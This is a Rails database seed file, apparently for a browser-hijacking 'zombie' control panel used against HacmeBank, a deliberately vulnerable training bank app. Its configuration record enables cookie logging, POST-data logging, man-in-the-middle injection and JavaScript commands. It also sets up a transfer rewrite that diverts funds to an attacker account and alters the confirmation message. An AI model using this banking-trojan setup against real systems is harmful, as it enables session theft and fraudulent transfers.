# This file should contain all the record creation needed to seed the database with its default values.
# The data can then be loaded with the rake db:seed (or created alongside the db with db:setup).
#
# Examples:
#
#   cities = City.create([{ name: 'Chicago' }, { name: 'Copenhagen' }])
#   Mayor.create(name: 'Emanuel', city: cities.first)

zombie_db = Zombie.create  :username  =>  "user2",:os  =>  "Windows NT 6.1",:browsername  =>  "Firefox",:browserversion  =>  "bversion",:lastseen  =>  "2012-05-28 18:03:00.000000",:hashid  =>  "eadacd9246f118b845500894bc75f505d5ec92a5ea"


Ccconfig.create  :balancepage => "HacmeBank_v2_Website\/aspx\/Main.aspx\?function1\=TransactionDetails\&account_no\=5204320422040001", :checksslvar => 0, :loginhost => "http://127.0.0.1/login/",:cookieloggerhost => "http://127.0.0.1/addcookie/",:cookieloggingenabled => 1,:enablemitm => 1,:jscommandid => 1,:jscommand => "alert(1)",:logoutpostdata => "lnkBtnLogOut",:modifyurl => "192.168.56.101/HacmeBank_v2_Website/aspx/main.aspx?",:myaccount => "(9999999999999999)",:newaccount => "9999999999999999",:origaccount => "5204320422040003",:origmsg => "Transfered 127.0.0.100 to 5204320422040003 ()",:postdataloggerhost => "http://127.0.0.1/addpostinfo/",:postenabled => 1,:cookielist => "SMSS,SMSV,datr",:transferurl => "btnTransfer",:uploadpath => "http://127.0.0.1/upload/", :zombie_id  => zombie_db
 
